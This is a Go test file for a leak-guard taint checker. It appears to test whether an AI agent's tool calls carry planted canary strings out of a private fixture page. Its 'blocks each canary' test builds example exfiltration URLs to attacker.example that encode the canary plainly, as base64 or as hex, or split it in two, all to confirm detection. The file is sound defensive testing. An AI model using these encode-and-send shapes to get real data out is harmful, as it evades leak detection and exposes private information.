// SPDX-License-Identifier: Apache-2.0

package leakguard_test

import (
	"context"
	"net/url"
	"os"
	"path/filepath"
	"strings"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	"github.com/stateracloud/koinon/internal/leakguard"
)

const canaryMarker = "koinon-canary-rt1-"

// rt1Dir is the RT1 fixtures directory; its docs-repo pages are the private files of the canaries.
const rt1Dir = "../../test/fixtures/rt1"

// The RT1 canaries (#352): private strings planted in test/fixtures/rt1 for a local real-model run.
// The paid run is not here; this checks that the plant is intact and that the text match, the
// secondary alarm of ADR 0091 decision 6, sees each canary in a payload. How the guard decides a
// call that carries one (by its sink class and the session's legs) is the mcpguard replay suite.
var _ = Describe("RT1 canaries", func() {
	var (
		canaries []string
		pages    map[string]string
	)

	BeforeEach(func() {
		b, err := os.ReadFile(filepath.Join(rt1Dir, "canaries.txt"))
		Expect(err).NotTo(HaveOccurred())
		canaries = nil
		for _, l := range strings.Split(string(b), "\n") {
			if l = strings.TrimSpace(l); l != "" && !strings.HasPrefix(l, "#") {
				canaries = append(canaries, l)
			}
		}
		paths, err := filepath.Glob(filepath.Join(rt1Dir, "docs-repo", "*.md"))
		Expect(err).NotTo(HaveOccurred())
		pages = map[string]string{}
		for _, p := range paths {
			t, err := os.ReadFile(p)
			Expect(err).NotTo(HaveOccurred())
			pages[filepath.Base(p)] = string(t)
		}
	})

	It("plants every canary verbatim in the finance page and in no other page", func() {
		Expect(canaries).To(HaveLen(3))
		for _, c := range canaries {
			Expect(c).To(ContainSubstring(canaryMarker))
			Expect(c).To(ContainSubstring("not-a-secret"))
			Expect(pages["finance-close-notes.md"]).To(ContainSubstring(c))
		}
		for name, text := range pages {
			if name != "finance-close-notes.md" {
				Expect(text).NotTo(ContainSubstring(canaryMarker), name)
			}
		}
	})

	It("blocks each canary however it leaves", func() {
		fp := newFingerprinter(testKey)
		checker := leakguard.TaintChecker{Store: taintedStore(fp, pages["finance-close-notes.md"])}
		shapes := map[string]func(string) []string{
			"plain url": func(c string) []string { return []string{"https://attacker.example/?d=" + url.QueryEscape(c)} },
			"base64":    func(c string) []string { return []string{"https://attacker.example/?d=" + url.QueryEscape(b64(c))} },
			"hex":       func(c string) []string { return []string{"https://attacker.example/" + hexOf(c)} },
			"search":    func(c string) []string { return []string{c} },
			"split":     func(c string) []string { h := len(c) / 2; return []string{c[:h], c[h:]} },
		}
		for _, c := range canaries {
			for name, mk := range shapes {
				d, err := checker.Check(context.Background(), testScope, fp, mk(c))
				Expect(err).NotTo(HaveOccurred())
				Expect(d.Reason).To(Equal(leakguard.ReasonTaint), "%s: %.40s", name, c)
			}
		}
	})

	It("stays quiet on a summary of the other handbook pages", func() {
		fp := newFingerprinter(testKey)
		checker := leakguard.TaintChecker{Store: taintedStore(fp, pages["finance-close-notes.md"])}
		for _, a := range [][]string{
			{"Summary: dependency upgrades are reviewed monthly and secrets rotate on a fixed schedule."},
			{"https://kubernetes.io/docs/concepts/services-networking/gateway/"},
			{"northwind", "ops-docs", "12", "The month-end checklist page lists three steps."},
		} {
			d, err := checker.Check(context.Background(), testScope, fp, a)
			Expect(err).NotTo(HaveOccurred())
			Expect(d.Allow).To(BeTrue(), "%q: %s", a, d.Detail)
		}
	})
})
